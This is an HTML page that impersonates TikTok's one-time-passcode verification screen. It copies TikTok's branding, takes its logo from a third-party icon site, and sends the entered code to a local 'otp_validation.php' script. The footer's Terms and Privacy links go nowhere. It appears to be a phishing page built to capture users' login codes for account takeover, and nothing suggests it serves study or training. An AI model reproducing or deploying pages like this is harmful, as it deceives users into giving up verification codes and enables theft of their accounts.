<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify OTP</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f8f8f8;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background-color: #EE1D52; /* TikTok's signature red-pink color */
      border-radius: 10px;
      padding: 20px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      color: white;
    }

    .logo {
      width: 100px;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }

    p {
      color: #fff;
      font-size: 14px;
    }

    .input-group {
      margin: 15px 0;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #ddd;
      font-size: 16px;
    }

    .btn {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-submit { background-color: #000; color: #fff; }

    a {
      text-decoration: none;
      color: #fff;
      font-size: 14px;
    }

    .footer {
      font-size: 12px;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="login-box">
    <!-- TikTok logo at the top -->
    <img src="https://img.icons8.com/color/96/ffffff/tiktok.png" alt="TikTok Logo" class="logo">

    <h1>Enter OTP</h1>
    <p>We have sent an OTP to your phone number or email.</p>

    <form action="otp_validation.php" method="POST">
      <div class="input-group">
        <input type="text" name="otp" placeholder="Enter OTP" required>
      </div>
      <button type="submit" class="btn btn-submit">Submit</button>
    </form>

    <div class="footer">
      <p>By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a>.</p>
      <p>Don’t have an account? <a href="#">Sign up</a></p>
    </div>
  </div>
</div>

</body>
</html>
